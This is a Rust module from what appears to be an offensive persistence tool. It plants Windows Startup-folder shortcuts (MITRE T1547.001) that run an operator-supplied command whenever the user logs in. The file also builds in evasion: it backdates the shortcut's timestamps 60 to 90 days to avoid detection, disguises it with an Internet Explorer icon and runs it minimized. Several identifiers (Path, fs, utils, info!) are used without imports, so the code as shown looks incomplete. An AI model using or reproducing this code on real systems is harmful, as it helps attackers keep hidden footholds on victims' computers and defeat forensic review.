// Startup Folder LNK Persistence
//
// Creates LNK shortcuts in the Windows Startup folder to achieve persistence.
// Shortcuts are executed when the user logs in.
//
// MITRE ATT&CK Technique: T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
// https://attack.mitre.org/techniques/T1547/001/

use crate::core::config::{Method, PersistConfig};
use crate::core::error::{PersistError, Result};
use std::path::PathBuf;

#[cfg(target_os = "windows")]
use std::time::SystemTime;

/// Execute startup folder operation based on configuration
pub fn execute(config: &PersistConfig) -> Result<()> {
    match config.method {
        Method::Add => add_persistence(config),
        Method::Remove => remove_persistence(config),
        Method::Check => check_persistence(config).map(|r| print_check_result(&r)),
        Method::List => list_persistence(),
    }
}

/// Get the startup folder path
#[cfg(target_os = "windows")]
fn get_startup_folder() -> Result<PathBuf> {
    use std::env;

    let appdata = env::var("APPDATA").map_err(|_| {
        PersistError::OperationFailed("Failed to get APPDATA environment variable".to_string())
    })?;

    Ok(PathBuf::from(appdata)
        .join("Microsoft")
        .join("Windows")
        .join("Start Menu")
        .join("Programs")
        .join("Startup"))
}

/// Get the startup folder path (non-Windows stub)
#[cfg(not(target_os = "windows"))]
#[allow(dead_code)] // Only used in tests on non-Windows platforms
fn get_startup_folder() -> Result<PathBuf> {
    Err(PersistError::PlatformNotSupported {
        technique: "StartupFolder".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Add startup folder persistence via LNK file
#[cfg(target_os = "windows")]
fn add_persistence(config: &PersistConfig) -> Result<()> {
    let command = config
        .command
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("command".to_string()))?;

    let file_name = config
        .file_path
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("file_path".to_string()))?;

    info!("Adding startup folder persistence");
    info!("Command: {}", command);
    info!("File Name: {}", file_name);

    let startup_path = get_startup_folder()?;
    let lnk_path = startup_path.join(format!("{}.lnk", file_name));

    // Check if LNK already exists
    if lnk_path.exists() {
        return Err(PersistError::AlreadyExists(
            "LNK file with that name already exists".to_string(),
        ));
    }

    // Create LNK file using mslnk crate
    create_lnk_file(
        &lnk_path,
        command,
        config.command_arg.as_deref().unwrap_or(""),
    )?;

    // Backdate the LNK file to avoid detection
    backdate_file(&lnk_path)?;

    // Verify LNK was created
    if lnk_path.exists() {
        let hash = utils::sha256_checksum(&lnk_path)?;

        println!();
        println!("[+] SUCCESS: Startup folder persistence created");
        println!("[*] INFO: LNK File located at: {}", lnk_path.display());
        println!("[*] INFO: SHA256 Hash of LNK file: {}", hash);
        println!();

        Ok(())
    } else {
        Err(PersistError::OperationFailed(
            "Startup folder persistence not created".to_string(),
        ))
    }
}

/// Create LNK shortcut file
#[cfg(target_os = "windows")]
fn create_lnk_file(lnk_path: &Path, target: &str, arguments: &str) -> Result<()> {
    use mslnk::ShellLink;

    let mut link = ShellLink::new(target)
        .map_err(|e| PersistError::OperationFailed(format!("Failed to create LNK: {}", e)))?;

    // Set arguments if provided
    if !arguments.is_empty() {
        link.set_arguments(Some(arguments.to_string()));
    }

    // Set icon to Internet Explorer to blend in
    link.set_icon_location(Some(
        r"C:\Program Files (x86)\Internet Explorer\iexplore.exe".to_string(),
    ));

    // Set to hidden window style (7 = minimized)
    link.set_show_command(7);

    // Save the LNK file
    link.save(lnk_path)
        .map_err(|e| PersistError::OperationFailed(format!("Failed to save LNK: {}", e)))?;

    Ok(())
}

/// Backdate file to 60-90 days ago to avoid recent file detection
#[cfg(target_os = "windows")]
fn backdate_file(path: &Path) -> Result<()> {
    use rand::Rng;

    let mut rng = rand::thread_rng();
    let days_back = rng.gen_range(60..=90);

    let new_time = SystemTime::now() - std::time::Duration::from_secs(days_back * 24 * 60 * 60);

    filetime::set_file_times(
        path,
        filetime::FileTime::from_system_time(new_time),
        filetime::FileTime::from_system_time(new_time),
    )
    .map_err(|e| PersistError::Io(e))?;

    Ok(())
}

/// Remove startup folder persistence
#[cfg(target_os = "windows")]
fn remove_persistence(config: &PersistConfig) -> Result<()> {
    let file_name = config
        .file_path
        .as_ref()
        .ok_or_else(|| PersistError::MissingParameter("file_path".to_string()))?;

    info!("Removing startup folder persistence");
    info!("File Name: {}", file_name);

    let startup_path = get_startup_folder()?;
    let lnk_path = startup_path.join(format!("{}.lnk", file_name));

    // Check if LNK exists
    if !lnk_path.exists() {
        return Err(PersistError::NotFound(
            "LNK file does not exist".to_string(),
        ));
    }

    // Delete the LNK file
    fs::remove_file(&lnk_path)?;

    // Verify deletion
    if !lnk_path.exists() {
        println!();
        println!("[+] SUCCESS: Startup folder persistence removed");
        println!();
        Ok(())
    } else {
        Err(PersistError::OperationFailed(
            "Startup folder persistence was not removed".to_string(),
        ))
    }
}

/// Check if startup folder persistence can be added
#[cfg(target_os = "windows")]
fn check_persistence(config: &PersistConfig) -> Result<CheckResult> {
    let mut result = CheckResult::new();

    let startup_path = get_startup_folder()?;

    result.add_success(format!(
        "Startup folder location: {}",
        startup_path.display()
    ));

    if let Some(file_name) = &config.file_path {
        let lnk_path = startup_path.join(format!("{}.lnk", file_name));

        if lnk_path.exists() {
            result.add_error(format!("LNK file '{}' already exists", file_name));
        } else {
            result.add_success(format!("LNK file '{}' does NOT exist", file_name));
        }
    }

    // Check for required parameters
    if config.command.is_none() || config.file_path.is_none() {
        result.add_error("Must provide both --command and --file-path".to_string());
    } else {
        result.add_success("Correct arguments provided".to_string());
    }

    Ok(result)
}

/// List LNK files in startup folder
#[cfg(target_os = "windows")]
fn list_persistence() -> Result<()> {
    let startup_path = get_startup_folder()?;

    println!();
    println!("[*] INFO: Listing all LNK files in startup folder");
    println!("[*] INFO: Current LNK files in: {}", startup_path.display());
    println!();

    if !startup_path.exists() {
        return Err(PersistError::NotFound(
            "Startup folder does not exist".to_string(),
        ));
    }

    // List all LNK files
    for entry in fs::read_dir(&startup_path)? {
        let entry = entry?;
        let path = entry.path();

        if path.extension().and_then(|s| s.to_str()) == Some("lnk") {
            if let Some(file_name) = path.file_name().and_then(|s| s.to_str()) {
                println!("[*] INFO: LNK File Name: {}", file_name);

                // Try to parse LNK and show details
                if let Ok(link) = mslnk::ShellLink::open(&path) {
                    if let Some(target) = link.link_info().and_then(|info| info.local_base_path()) {
                        println!("[*] INFO: LNK Target Path: {}", target);
                    }
                    if let Some(args) = link.arguments() {
                        println!("[*] INFO: LNK Arguments: {}", args);
                    }
                }

                println!();
            }
        }
    }

    Ok(())
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn add_persistence(_config: &PersistConfig) -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "StartupFolder".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn remove_persistence(_config: &PersistConfig) -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "StartupFolder".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn check_persistence(_config: &PersistConfig) -> Result<CheckResult> {
    Err(PersistError::PlatformNotSupported {
        technique: "StartupFolder".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Platform stub for non-Windows
#[cfg(not(target_os = "windows"))]
fn list_persistence() -> Result<()> {
    Err(PersistError::PlatformNotSupported {
        technique: "StartupFolder".to_string(),
        platform: "Windows".to_string(),
    })
}

/// Result of a check operation
#[derive(Debug)]
#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
struct CheckResult {
    successes: Vec<String>,
    errors: Vec<String>,
}

#[cfg_attr(not(target_os = "windows"), allow(dead_code))]
impl CheckResult {
    fn new() -> Self {
        Self {
            successes: Vec::new(),
            errors: Vec::new(),
        }
    }

    fn add_success(&mut self, msg: String) {
        self.successes.push(msg);
    }

    fn add_error(&mut self, msg: String) {
        self.errors.push(msg);
    }
}

fn print_check_result(result: &CheckResult) {
    println!();
    for success in &result.successes {
        println!("[+] SUCCESS: {}", success);
    }
    for error in &result.errors {
        println!("[-] ERROR: {}", error);
    }
    println!();
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_get_startup_folder() {
        #[cfg(target_os = "windows")]
        {
            let result = get_startup_folder();
            assert!(result.is_ok());
        }

        #[cfg(not(target_os = "windows"))]
        {
            let result = get_startup_folder();
            assert!(result.is_err());
        }
    }
}
